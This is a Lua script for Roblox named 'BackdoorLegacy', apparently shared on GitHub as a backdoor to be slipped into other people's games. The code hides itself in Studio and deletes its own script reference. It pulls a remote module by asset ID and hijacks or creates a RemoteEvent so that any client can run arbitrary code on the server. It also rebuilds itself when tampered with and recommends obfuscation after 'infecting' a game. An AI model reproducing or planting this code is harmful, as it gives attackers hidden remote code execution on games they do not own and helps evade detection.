-- BackdoorLegacy 
-- By IvanTheSkid 

-- github.com/IvanTheProtogen/BackdoorLegacy

-- Features we have:
-- -- Data logging
-- -- Anti-tamper remote
-- -- Compatibility with any backdoor scanner
-- -- Multiple code execution support 
-- -- Stealthiness 
-- -- Shortcuts (%username%, %userid%)

-- INTERACTION WITH THE BACKDOOR WILL EXPOSE YOU!
-- DATA INCLUDED:
-- -- player that executed the backdoor
-- -- code that is sent thru
-- -- success indicator
-- -- error message or returned values
-- SCARED TO HAVE YOUR C00LGUI LEAKED? BOOHOO, SKID!

-- IT IS RECOMMENDED TO OBFUSCATE THE CODE AFTER INFECTING IT WITH THIS BACKDOOR

if game:GetService("RunService"):IsStudio() then 
	return 
end

pcall(function()
	getfenv().script:Destroy()
	getfenv().script = nil 
end)

local loadstring
local rmt
local conA
local conB
local newBD
local delBD
local onExec
local onExecP
local onTamper 
while (task.wait or wait or true)() do 
	local suc 
	suc,loadstring = pcall(require,14132891321)
	if suc and loadstring then 
		break 
	end 
end
function onExec(plr,...)
	for i,v in pairs({...}) do
		v = v:gsub("%username%",plr.Name):gsub("%userid%",plr.UserId)
		onExecP(plr,v,pcall(function()return loadstring:SpawnS(v,workspace)end))
	end
end
function onExecP(plr,v,...)
	rmt:FireAllClients(plr,v,...)
end
function newBD()
	for _,inst in game:GetDescendants() do 
		if inst:IsA("RemoteEvent") then 
			rmt = inst 
			break
		end 
	end 
	rmt = rmt or Instance.new("RemoteEvent",workspace)
	conA = rmt.OnServerEvent:connect(onExec)
	conB = rmt.Changed:connect(onTamper)
	return rmt
end
function delBD()
	rmt = nil
	pcall(function()
		conA:disconnect()
	end)
	conA = nil
	pcall(function()
		conB:disconnect()
	end)
	conB = nil
end
function onTamper()
	delBD()
	newBD()
end
newBD()
